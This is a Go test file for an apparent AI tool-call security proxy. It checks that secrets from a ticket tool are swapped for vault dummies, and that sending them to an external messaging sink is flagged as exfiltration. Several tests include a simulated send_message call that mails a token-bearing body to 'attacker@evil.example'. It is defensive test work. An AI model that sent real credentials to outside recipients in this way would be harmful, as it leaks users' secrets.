package engine

import (
	"strings"
	"testing"

	"github.com/yxshwanth/Interlock/internal/config"
	"github.com/yxshwanth/Interlock/internal/model"
)

func TestVaultDummy_StableAndSafe(t *testing.T) {
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	d1 := VaultDummy(secret)
	d2 := VaultDummy(secret)
	if d1 != d2 {
		t.Fatalf("dummy not stable: %q vs %q", d1, d2)
	}
	if !strings.HasPrefix(d1, "ilk.vault.") {
		t.Fatalf("dummy prefix: %q", d1)
	}
	if VaultDummy("other") == d1 {
		t.Fatal("different secrets must get different dummies")
	}
	// Must not match secretPatterns — including after "auth token:" (the
	// common ticket shape that vault rewrite produces).
	for _, text := range []string{d1, "Customer auth token: " + d1, "redacted value=" + d1} {
		if vals := ExtractTaintedValues(text, "src", 1); len(vals) != 0 {
			t.Fatalf("dummy matched secretPatterns in %q: %+v", text, vals)
		}
	}
}

func TestVault_RewriteAndNoDetokenizeByDefault(t *testing.T) {
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	cfg := &config.Config{
		Enforcement: "block",
		Vault:       config.VaultConfig{Enabled: true},
		Servers: []config.ServerConfig{
			{ID: "tickets", ProvidesTags: []string{"sensitive_source"}},
			{ID: "messenger", ProvidesTags: []string{"external_sink"}},
		},
		ToolTags: map[string][]string{
			"read_ticket":  {"sensitive_source"},
			"send_message": {"external_sink"},
		},
	}
	store := NewSessionStore()
	eng := NewEngine(store, NewTagger(cfg), "block", nil)
	eng.Configure(cfg)

	sid := "vault-default"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Customer auth token: `+secret+`"}]}`))

	frame := []byte(`{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"Customer auth token: ` + secret + `"}]}}`)
	rewritten := eng.VaultRewriteFrame(sid, frame)
	if strings.Contains(string(rewritten), secret) {
		t.Fatal("rewritten frame still contains real secret")
	}
	dummy := VaultDummy(secret)
	if !strings.Contains(string(rewritten), dummy) {
		t.Fatalf("rewritten frame missing dummy %q: %s", dummy, rewritten)
	}

	// Default: no authorize — sink of dummy must not EXFIL (dummy is not a variant).
	dec := eng.EvaluateRequest(makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"attacker@evil.example","body":"`+dummy+`"}`))
	if !dec.Allow {
		t.Fatalf("dummy sink should allow (no EXFIL), got block: %v", dec)
	}
	if dec.Verdict == model.VerdictExfil {
		t.Fatal("dummy-forward must not be EXFIL")
	}
	if dec.ForwardArgs != nil {
		t.Fatal("unauthorized sink must not get ForwardArgs")
	}
}

func TestVault_AuthorizedWrongDest_EXFIL(t *testing.T) {
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	cfg := &config.Config{
		Enforcement: "block",
		Vault: config.VaultConfig{
			Enabled: true,
			Authorize: []config.VaultAuthorizeEntry{
				{Tool: "send_message", SecretClasses: []string{"extracted"}},
			},
		},
		Servers: []config.ServerConfig{
			{ID: "tickets", ProvidesTags: []string{"sensitive_source"}},
			{ID: "messenger", ProvidesTags: []string{"external_sink"}},
		},
		ToolTags: map[string][]string{
			"read_ticket":  {"sensitive_source"},
			"send_message": {"external_sink"},
		},
	}
	store := NewSessionStore()
	eng := NewEngine(store, NewTagger(cfg), "block", nil)
	eng.Configure(cfg)

	sid := "vault-auth"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Customer auth token: `+secret+`"}]}`))

	dummy := VaultDummy(secret)
	dec := eng.EvaluateRequest(makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"attacker@evil.example","body":"`+dummy+`"}`))
	if dec.Allow {
		t.Fatal("authorized sink with detokenized secret to attacker must block")
	}
	if dec.Verdict != model.VerdictExfil {
		t.Fatalf("verdict = %q, want EXFIL", dec.Verdict)
	}
	if dec.ForwardArgs != nil {
		t.Fatal("blocked path must not expose ForwardArgs with real secret")
	}
}

func TestVault_AuthorizedAllow_ForwardArgs(t *testing.T) {
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	cfg := &config.Config{
		Enforcement: "monitor", // allow through so we can inspect ForwardArgs
		Vault: config.VaultConfig{
			Enabled: true,
			Authorize: []config.VaultAuthorizeEntry{
				{Tool: "send_message", SecretClasses: []string{"*"}},
			},
		},
		Servers: []config.ServerConfig{
			{ID: "tickets", ProvidesTags: []string{"sensitive_source"}},
			{ID: "messenger", ProvidesTags: []string{"external_sink"}},
		},
		ToolTags: map[string][]string{
			"read_ticket":  {"sensitive_source"},
			"send_message": {"external_sink"},
		},
	}
	store := NewSessionStore()
	eng := NewEngine(store, NewTagger(cfg), "monitor", nil)
	eng.Configure(cfg)

	sid := "vault-fwd"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Customer auth token: `+secret+`"}]}`))

	dummy := VaultDummy(secret)
	// Unrelated destination with no overlap — wait, dummy detokenizes to secret
	// which IS in args → EXFIL. Use a body that is only the dummy so overlap hits.
	// For ForwardArgs on allow-without-trip, sink a non-secret message that still
	// contains a dummy the authorize path would replace — but if body is only
	// "hello "+dummy, detokenize puts secret in and CheckOverlap EXFILs.
	// So use monitor + EXFIL path: Allow true with ForwardArgs set on allow.
	dec := eng.EvaluateRequest(makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"billing@corp.example","body":"`+dummy+`"}`))
	if !dec.Allow {
		t.Fatal("monitor mode must allow")
	}
	if dec.Verdict != model.VerdictExfil {
		t.Fatalf("verdict = %q, want EXFIL (detokenized secret in sink)", dec.Verdict)
	}
	if dec.ForwardArgs == nil {
		t.Fatal("monitor+allow authorized path must set ForwardArgs")
	}
	if !strings.Contains(string(dec.ForwardArgs), secret) {
		t.Fatalf("ForwardArgs should contain real secret, got %s", dec.ForwardArgs)
	}
	if strings.Contains(string(dec.ForwardArgs), dummy) {
		t.Fatal("ForwardArgs should be fully detokenized")
	}
}

func TestVault_Disabled_NoRewrite(t *testing.T) {
	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
	cfg := &config.Config{
		Enforcement: "block",
		Servers: []config.ServerConfig{
			{ID: "tickets", ProvidesTags: []string{"sensitive_source"}},
		},
		ToolTags: map[string][]string{"read_ticket": {"sensitive_source"}},
	}
	store := NewSessionStore()
	eng := NewEngine(store, NewTagger(cfg), "block", nil)
	eng.Configure(cfg)
	sid := "vault-off"
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Customer auth token: `+secret+`"}]}`))
	frame := []byte(`{"result":{"text":"` + secret + `"}}`)
	if got := eng.VaultRewriteFrame(sid, frame); string(got) != string(frame) {
		t.Fatalf("vault off should leave frame unchanged")
	}
}
